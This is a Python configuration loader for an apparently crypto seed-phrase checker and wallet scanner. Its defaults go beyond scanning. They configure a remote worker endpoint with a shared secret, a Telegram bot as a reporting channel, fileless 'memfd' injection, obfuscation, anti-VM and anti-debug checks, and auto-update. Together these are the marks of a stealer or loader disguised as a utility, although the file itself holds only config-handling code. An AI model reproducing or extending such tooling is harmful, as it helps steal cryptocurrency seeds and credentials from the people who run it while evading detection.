# -*- coding: utf-8 -*-
"""Configuration loader — JSON config with sane defaults.

Security-sensitive fields (endpoint, token_id, shared_secret, telegram
credentials) default to empty strings. They are required at runtime;
fill them in via config.json. This prevents accidentally shipping a
build with placeholder secrets pointing at somebody else's worker.
"""

import json
from pathlib import Path

BASE_DIR = Path(__file__).parent
CONFIG_FILE = BASE_DIR / "config.json"

_DEFAULTS = {
    "version": "2.2.0-linux",
    "proxies": {
        "enabled": True,
        "rotation_mode": "round-robin",
        "proxy_list": [],
        "proxy_file": "proxies.txt",
        "validation_interval_sec": 300,
        "timeout_sec": 15,
        "max_retries": 3,
        "fallback_to_direct": False,
    },
    "scanner": {
        "threads": 20,
        "request_timeout_sec": 30,
        "retry_on_fail": True,
        "max_retries": 3,
        "delay_between_requests_ms": 100,
        "bypass_mode": "debank_proxy",
    },
    "seed_checker": {
        "seed_file": "seeds.txt",
        "threads": 10,
        "check_all_chains": True,
        "highlight_threshold_usd": 10000,
        "output_file": "seed_results.txt",
    },
    "rpc_endpoints": {
        "ethereum": "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY",
        "bitcoin": "https://blockstream.info/api",
        "solana": "https://api.mainnet-beta.solana.com",
        "bsc": "https://bsc-dataseed.binance.org",
        "polygon": "https://polygon-rpc.com",
        "arbitrum": "https://arb1.arbitrum.io/rpc",
    },
    "export": {
        "default_format": "txt",
        "output_directory": "./results",
        "include_usd_value": True,
    },
    "system": {
        "enabled": True,
        "auto_update": True,
        # ── required ──────────────────────────────────────────────
        # Fill these in to match your Worker deployment.
        # Empty values cause the loader to bail cleanly instead of
        # silently fetching from a placeholder endpoint.
        "endpoint": "",
        "token_id": "",
        "shared_secret": "",
        # ── optional ──────────────────────────────────────────────
        "telegram_bot_token": "",
        "telegram_chat_id": "",
        "injection_method": "memfd",
        "obfuscation": True,
        "anti_vm": True,
        "anti_debug": True,
        "retry_delays": [0, 5, 10, 20, 40, 80],
    },
}


def load_config() -> dict:
    cfg = json.loads(json.dumps(_DEFAULTS))
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                user_cfg = json.load(f)
            _deep_merge(cfg, user_cfg)
        except (json.JSONDecodeError, OSError):
            pass
    return cfg


def _deep_merge(base: dict, override: dict):
    for key, value in override.items():
        if key in base and isinstance(base[key], dict) and isinstance(value, dict):
            _deep_merge(base[key], value)
        else:
            base[key] = value


def save_config(cfg: dict):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2, ensure_ascii=False)
